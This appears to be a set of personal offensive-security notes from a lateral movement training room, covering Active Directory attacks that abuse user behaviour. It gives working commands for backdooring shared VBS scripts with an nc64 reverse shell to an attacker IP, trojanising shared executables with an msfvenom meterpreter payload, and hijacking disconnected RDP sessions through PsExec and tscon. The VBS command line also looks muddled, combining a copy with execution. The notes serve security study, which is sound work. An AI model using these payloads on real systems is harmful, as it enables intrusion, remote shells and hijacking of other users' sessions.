#  AD Lateral Movement - Abusing User Behaviour


## Abusing Writable Shares

It is common to find network shares for legitmate user to perform daily tasks, if these shares are writable then planting files to force users into executing an arbituary payload.
1. Find of shortcut to a script or executable hosted on the network share
	 - Rationale: Administrator can maintain it on the share and Users do not have to copy or install it.
2. Check Writtability
3. Modify by adding payload
4. If users opens the shortcut, the executable is copied to that user's workstation's `%temp%` folder. 


## Backdooring .vbs Script

If a shared resource is a VBS Script, copy a some reverse shell onto the same share and inject the below into the VBS script:
```vb
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\<share host>\myshare\nc64.exe -e cmd.exe <attacker_ip> 1234" 0, True
```
The executable is copied to the user's workstation's `%temp%` folder that interacted with the shared VBS script. 

## Backdooring .exe Files

If a shared file is a Windows binary, download it and backdoor it with msfvenom then reupload.
```bash
msfvenom -a x64 --platform windows -x shared-executable.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o backdoor.exe
```


## RDP hijacking

**Requires**
- SYSTEM privileges on Windows Server <= 2016 
- [[Sysinternals-Psexec]] 
When Administrators connect to a machine and close the RDP client instead of logging off then machine the session will remain open on the server indefinitely.

Open up a cmd.exe with `PsExec64.exe`
```powershell
PsExec64.exe -s cmd.exe
```
List existing RDP sessions
```batch
C:\> query user
USERNAME              SESSIONNAME       ID STATE   IDLE TIME  LOGON TIME
administrator         rdp-tcp#1         1  Active          .  4/1/2022 4:09 AM
baduser                                 2  Disc            .  4/6/2022 6:51 AM
```

The `baduser` has left a RDP session open, i.e any session with Disc state is left open and not currently in use. With the session's `ID` we hijack it sending it with the `/dest:` to our current RDP `SESSIONNAME` 
```powershell
tscon 2 /dest:rdp-tcp#1
```


## References

[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting)